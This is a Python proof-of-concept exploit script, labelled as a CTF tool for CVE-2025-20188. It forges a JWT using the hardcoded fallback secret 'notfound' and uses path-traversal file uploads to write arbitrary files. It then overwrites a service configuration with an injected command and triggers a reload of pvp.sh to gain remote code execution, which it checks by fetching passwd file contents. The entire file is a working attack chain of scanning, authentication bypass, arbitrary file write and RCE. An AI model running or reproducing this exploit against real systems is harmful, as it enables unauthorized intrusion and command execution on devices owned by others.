#!/usr/bin/env python3
import json
import time
import requests
import jwt  # PyJWT library
import argparse
import os
import sys
import urllib3

# Disable InsecureRequestWarning for self-signed certs common in lab/testing environments.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def load_config(config_path):
    """Load settings from a JSON configuration file."""
    try:
        with open(config_path, "r") as f:
            config = json.load(f)
        return config
    except Exception as e:
        print(f"[!] Failed to load configuration file: {e}")
        sys.exit(1)


def generate_jwt_token(req_id, fallback_secret, exp_delta=300):
    """
    Generate a JWT token using the fallback secret (e.g., "notfound").
    
    Payload includes:
      - reqid: identifier (e.g., 'cdb_token_request_id1')
      - exp: expiration time (current time + exp_delta seconds)
    """
    payload = {
        "reqid": req_id,
        "exp": int(time.time()) + exp_delta
    }
    token = jwt.encode(payload, fallback_secret, algorithm="HS256", headers={"typ": "JWT"})
    # Ensure token is a string (PyJWT v2+ returns a string)
    return token if isinstance(token, str) else token.decode("utf-8")


def scan_vulnerability(config):
    """
    Scan the target to check for signs of vulnerability.
    
    The idea is to send a dummy file upload or request without a valid JWT
    so that the server responds with a signature mismatch or unauthorized error.
    """
    target = config["target"]
    port = config.get("port", 8443)
    endpoint = config["upload_endpoint"]
    url = f"https://{target}:{port}{endpoint}"
    headers = {"User-Agent": "CTF-Scanner"}
    files = {"dummy": ("dummy.txt", "test")}
    
    print(f"[*] Scanning {url} for vulnerability indicators...")
    try:
        # Sending with an invalid JWT token
        response = requests.post(url, headers=headers, files=files, verify=False)
    except Exception as e:
        print(f"[!] Error during vulnerability scan: {e}")
        return False

    # Expecting a 401 (or 405) with a signature mismatch or similar error
    if response.status_code in [401, 405] and "JWT" in response.text or "signature mismatch" in response.text.lower():
        print(f"[+] Vulnerability appears present. Received status code {response.status_code}")
        return True
    else:
        print(f"[-] No clear vulnerability detected (status code {response.status_code}).")
        return False


def upload_file(config, jwt_token):
    """
    Upload a file via the vulnerable endpoint.
    
    This function performs the file upload using multipart/form-data.
    The file is named using path traversal (as provided in the JSON config)
    so it will be written to a target location (e.g. web root).
    """
    target = config["target"]
    port = config.get("port", 8443)
    endpoint = config["upload_endpoint"]
    url = f"https://{target}:{port}{endpoint}?jwt={jwt_token}"
    
    headers = {"User-Agent": "CTF-Exploit-POC"}
    upload_field = config.get("upload_field", "file")
    filename = config["file_upload"]["filename"]
    file_content = config["file_upload"]["content"]
    
    print(f"[*] Uploading file to {url} with filename '{filename}' ...")
    try:
        files = {upload_field: (filename, file_content, "application/octet-stream")}
        response = requests.post(url, headers=headers, files=files, verify=False)
    except Exception as e:
        print(f"[!] Error during file upload: {e}")
        return None

    print(f"[*] File upload HTTP Status Code: {response.status_code}")
    print(f"[*] Response Text:\n{response.text}")
    return response


def verify_upload(config):
    """
    Verify that the uploaded file is accessible.
    
    This sends a GET request to the location where the file was dropped.
    """
    target = config["target"]
    port = config.get("port", 8443)
    verify_path = config["file_upload"].get("verify_path", "/foo.txt")
    url = f"https://{target}:{port}{verify_path}"
    
    headers = {"User-Agent": "CTF-Exploit-POC"}
    print(f"[*] Verifying upload by accessing {url} ...")
    
    try:
        response = requests.get(url, headers=headers, verify=False)
        print(f"[*] Verification HTTP Status: {response.status_code}")
        print(f"[*] Retrieved File Content:\n{response.text}")
        return response
    except Exception as e:
        print(f"[!] Verification failed: {e}")
        return None


def trigger_rce(config, jwt_token):
    """
    Trigger Remote Code Execution (RCE) via abusing pvp.sh behavior.
    
    This function performs two distinct uploads:
      1. Overwrite an existing configuration file with our own command,
         effectively injecting our payload. (config_upload)
      2. Upload a trigger file to force the service to reload the configuration.
    
    Afterwards, a verification step is performed by accessing an endpoint that
    reveals command execution results.
    """
    target = config["target"]
    port = config.get("port", 8443)
    headers = {"User-Agent": "CTF-RCE-POC"}

    # --- Step 1: Overwrite configuration with our payload ---
    rce_upload = config["rce"]["config_upload"]
    filename = rce_upload["filename"]
    payload = rce_upload["payload"]

    config_upload_url = f"https://{target}:{port}{config['upload_endpoint']}?jwt={jwt_token}"
    print(f"[*] Uploading RCE config file to {config_upload_url} with filename '{filename}' ...")
    try:
        files = {config.get("upload_field", "file"): (filename, payload, "application/octet-stream")}
        response1 = requests.post(config_upload_url, headers=headers, files=files, verify=False)
    except Exception as e:
        print(f"[!] Error during RCE config file upload: {e}")
        return False

    print(f"[*] RCE config upload HTTP Status Code: {response1.status_code}")
    print(f"[*] RCE config response:\n{response1.text}")

    # --- Step 2: Upload a trigger file to force pvp.sh reload ---
    trigger_upload = config["rce"]["trigger_upload"]
    trg_filename = trigger_upload["filename"]
    trg_payload = trigger_upload["payload"]

    print(f"[*] Uploading RCE trigger file with filename '{trg_filename}' ...")
    try:
        files = {config.get("upload_field", "file"): (trg_filename, trg_payload, "application/octet-stream")}
        response2 = requests.post(config_upload_url, headers=headers, files=files, verify=False)
    except Exception as e:
        print(f"[!] Error during RCE trigger file upload: {e}")
        return False

    print(f"[*] RCE trigger upload HTTP Status Code: {response2.status_code}")
    print(f"[*] RCE trigger response:\n{response2.text}")
    return True


def verify_rce(config):
    """
    Verify Remote Code Execution by accessing a verification endpoint.
    
    The verification endpoint (e.g., /webui/login/etc_passwd) should display output
    indicative of command execution (for example, contents of the passwd file).
    """
    target = config["target"]
    port = config.get("port", 8443)
    verify_ep = config["rce"]["verification_endpoint"]
    url = f"https://{target}:{port}{verify_ep}"
    
    headers = {"User-Agent": "CTF-RCE-POC"}
    print(f"[*] Verifying RCE trigger by accessing {url} ...")
    
    try:
        response = requests.get(url, headers=headers, verify=False)
        if response.status_code == 200 and config["rce"]["verification_keyword"] in response.text:
            print("[+] RCE Trigger appears successful. Command execution achieved!")
        else:
            print("[-] RCE verification did not return expected output. Check your payload and settings.")
        print(f"[*] Verification response:\n{response.text}")
        return response
    except Exception as e:
        print(f"[!] Error during RCE verification: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="CTF PoC Exploit for CVE-2025-20188 with integrated RCE trigger and scanning"
    )
    parser.add_argument("-c", "--config", default="config.json", help="Path to JSON configuration file")
    parser.add_argument("-m", "--mode", choices=["scan", "exploit", "all"], default="all",
                        help="Mode to run: scan (only vulnerability check), exploit (upload file only), "
                             "or all (upload file + RCE trigger)")
    args = parser.parse_args()

    config = load_config(args.config)
    print("[*] Loaded Configuration:")
    print(json.dumps(config, indent=4))

    # First, if scanning mode is requested, then scan the target.
    if args.mode in ["scan", "all"]:
        vulnerable = scan_vulnerability(config)
        if not vulnerable:
            print("[!] Target does not appear to be vulnerable. Aborting further actions.")
            if args.mode == "scan":
                sys.exit(0)
            # Else continue if in all mode to demonstrate the PoC
        else:
            print("[*] Vulnerability confirmed. Proceeding...")

    # Generate JWT token using fallback ("notfound").
    jwt_req_id = config.get("jwt_req_id", "cdb_token_request_id1")
    fallback_secret = config.get("jwt_fallback", "notfound")
    jwt_token = generate_jwt_token(jwt_req_id, fallback_secret)
    print(f"[*] Generated JWT Token: {jwt_token}")

    # If mode is exploit or all, run file upload.
    if args.mode in ["exploit", "all"]:
        upload_resp = upload_file(config, jwt_token)
        if upload_resp and upload_resp.status_code == 200:
            print("[+] File upload appears successful!")
            verify_upload(config)
        else:
            print("[-] File upload failed or returned unexpected status.")

    # If we are doing full exploitation (mode all) and RCE is enabled in config
    if args.mode == "all" and config.get("rce", {}).get("enabled", False):
        print("[*] Initiating RCE trigger phase ...")
        rce_success = trigger_rce(config, jwt_token)
        if rce_success:
            # Allow some time for the backend to reload the configuration and execute our payload.
            print("[*] Waiting 5 seconds before verifying RCE execution ...")
            time.sleep(5)
            verify_rce(config)
        else:
            print("[-] RCE trigger failed.")


if __name__ == "__main__":
    main()